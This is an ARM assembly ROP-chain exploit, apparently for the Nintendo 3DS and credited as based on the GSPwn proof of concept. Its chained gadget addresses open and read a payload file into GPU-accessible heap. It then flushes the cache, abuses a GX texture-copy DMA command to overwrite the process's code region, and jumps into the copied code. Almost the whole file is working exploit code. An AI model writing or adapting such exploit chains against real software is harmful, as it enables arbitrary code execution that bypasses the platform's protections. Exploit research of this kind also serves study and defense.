	.arm
	.text

@---------------------------------------------------------------------------------
@ Based on GSPwn 6.3 PoC
@    by smea
@---------------------------------------------------------------------------------

#define GSPHEAP 0x14000000
#define CODELOAD GSPHEAP
#define CODESIZE 1024*64

#define TEXTPAOFFSET 0x03F00000


	.global	_start
@---------------------------------------------------------------------------------
_start:
@---------------------------------------------------------------------------------
	.word 0x0011be4d 		@ pop {r1, r2, r3, pc}
		.word FileName		@ r1 (wchar* "YS:/boot.bin")
		.word 0x00000001 	@ r2 (openflags)
		.word 0xdeadbeef 	@ r3 (garbage)
	.word 0x001a9349 		@ pop {r0, pc}
		.word FILE	    	@ r0 (_this)
	.word 0x001C08B8 		@ IFile_Open(_this, path, openflags)
		.word 0xdeadbeef 	@ r4 (garbage)
		.word 0xdeadbeef 	@ r5 (garbage)
		.word 0xdeadbeef 	@ r6 (garbage)
		.word 0xdeadbeef 	@ r7 (garbage)
		.word 0xdeadbeef 	@ r8 (garbage)
	.word 0x0011be4d		@ pop {r1, r2, r3, pc}
		.word bytesread		@ r1 (&bytesread)
		.word CODELOAD		@ r2 (src)
		.word CODESIZE		@ r3 (size)
	.word 0x001a9349		@ pop {r0, pc}
		.word FILE		@ r0 (_this)
	.word 0x001BC18C		@ IFile_Read(_this, &bytesread, src, size)
		.word 0xdeadbeef	@ r4 (garbage)
		.word 0xdeadbeef	@ r5 (garbage)
		.word 0xdeadbeef	@ r6 (garbage)
		.word 0xdeadbeef	@ r7 (garbage)
		.word 0xdeadbeef	@ r8 (garbage)
		.word 0xdeadbeef	@ r9 (garbage)

@---------------------------------------------------------------------------------
@ flush data cache
@---------------------------------------------------------------------------------
	.word 0x0011be4d 		@ pop {r1, r2, r3, pc}
		.word 0xFFFF8001	@ r1 (kprocess handle)
		.word CODELOAD		@ r2 (address)
		.word CODESIZE		@ r3 (size)
	.word 0x001a9349		@ pop {r0, pc}
		.word 0x0028DBEC	@ r0 (handle)
	.word 0x0013D400		@ GSPGPU_FlushDataCache (ends in ldmfd   sp!, {r4-r6,pc})
		.word 0xDEADDEAD	@ r4 (garbage)
		.word 0xDEADDEAD	@ r5 (garbage)
		.word 0xDEADDEAD	@ r6 (garbage)

@---------------------------------------------------------------------------------
@ load r0 value (nn__gxlow__CTR__detail__GetInterruptReceiver)
@---------------------------------------------------------------------------------
	.word 0x001a9349 		@ pop {r0, pc}
		.word 0x0028DBF4	@; r0
	.word 0x0011be4d		@ pop {r1, r2, r3, pc}
		.word 0xDEADDEAD	@ r1 (garbage)
		.word 0x00000058	@ r2
		.word 0xDEADDEAD	@ r3 (garbage)
	.word 0x001b7943		@ ldr r0, [r0] | pop {r4,pc}
		.word 0xDEADDEAD	@ r4 (garbage)
	.word 0x001dac40		@ pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}
		.word 0xDEADDEAD	@ r4 (garbage)
		.word 0xDEADDEAD	@ r5 (garbage)
		.word 0xDEADDEAD	@ r6 (garbage)
		.word 0xDEADDEAD	@ r7 (garbage)
		.word 0xDEADDEAD	@ r8 (garbage)
		.word 0xDEADDEAD	@ r9 (garbage)
		.word 0xDEADDEAD	@ r10 (garbage)
		.word 0xDEADDEAD	@ r11 (garbage)
		.word 0x0019e328	@ r12 (next return address) (add r0, r0, r2 | bx lr | pop {r1, pc})
	.word 0x0025E224		@ ldmfd  sp!, {r4,lr} | bx  r12
		.word 0xDEADDEAD	@ r4 (garbage)
		.word 0x00192ab5	@ lr (next return address) (pop {r1, pc})

@---------------------------------------------------------------------------------
@ equivalent to .word 0x0019e328 ; add	r0, r0, r2 | bx	lr | pop {r1, pc}
@---------------------------------------------------------------------------------
@ load gx command buffer address into r1
@---------------------------------------------------------------------------------
		.word gxCommand		@ (r1)
@---------------------------------------------------------------------------------
@ send gx command
@---------------------------------------------------------------------------------
	.word 0x001B4E90		@ nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in ldmfd sp!, {r4-r10,pc})
		.word 0xDEADDEAD	@ r4 (garbage)
		.word 0xDEADDEAD	@ r5 (garbage)
		.word 0xDEADDEAD	@ r6 (garbage)
		.word 0xDEADDEAD	@ r7 (garbage)
		.word 0xDEADDEAD	@ r8 (garbage)
		.word 0xDEADDEAD	@ r9 (garbage)
		.word 0xDEADDEAD	@ r10 (garbage)

@---------------------------------------------------------------------------------
@ sleep for a bit (wait for DMA to be done) and jump to copied code
@---------------------------------------------------------------------------------
	.word 0x001dac40		@ pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}
		.word 0xDEADDEAD	@ r4 (garbage)
		.word 0xDEADDEAD	@ r5 (garbage)
		.word 0xDEADDEAD	@ r6 (garbage)
		.word 0xDEADDEAD	@ r7 (garbage)
		.word 0xDEADDEAD	@ r8 (garbage)
		.word 0xDEADDEAD	@ r9 (garbage)
		.word 0xDEADDEAD	@ r10 (garbage)
		.word 0xDEADDEAD	@ r11 (garbage)
		.word 0x001a9349	@ r12 (next return address) (pop {r0, pc})
	.word 0x0025E224		@ ldmfd  sp!, {r4,lr} | bx  r12
		.word 0xDEADDEAD	@ r4 (garbage)
		.word 0x00100000	@ lr (next return address) (code !)
@---------------------------------------------------------------------------------
@ equivalent to .word 0x001a9349 ; pop {r0, pc}
@---------------------------------------------------------------------------------
		.word 0x3B9ACA00	@ r0 = 1 second

	.word 0x001B6C6C		@ svcSleepThread

	.align 4
@---------------------------------------------------------------------------------
gxCommand:
@---------------------------------------------------------------------------------
	.word 0x00000004		@ command header (SetTextureCopy)
	.word GSPHEAP			@ source address
	.word TEXTPAOFFSET+GSPHEAP	@ destination address
	.word 0x00010000		@ size
	.word 0xFFFFFFFF		@ dim in
	.word 0xFFFFFFFF		@ dim out
	.word 0x00000008		@ flags
	.word 0x00000000		@ unused


FileName:
	.string16 "YS:/boot.bin"

	.balign 32
FILE:	.fill	32, 1, 0

bytesread:
	.word	0

